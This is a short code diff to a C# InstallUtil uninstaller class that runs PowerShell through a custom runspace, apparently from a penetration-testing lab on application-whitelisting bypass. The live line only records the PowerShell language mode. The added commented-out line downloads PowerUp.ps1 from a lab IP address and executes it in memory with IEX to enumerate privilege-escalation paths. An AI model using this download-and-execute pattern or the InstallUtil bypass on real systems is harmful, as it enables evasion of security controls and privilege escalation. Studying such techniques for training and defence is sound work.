@@ -21,6 +21,7 @@ namespace InstallUtil
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
+            //  String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.71/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
             String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
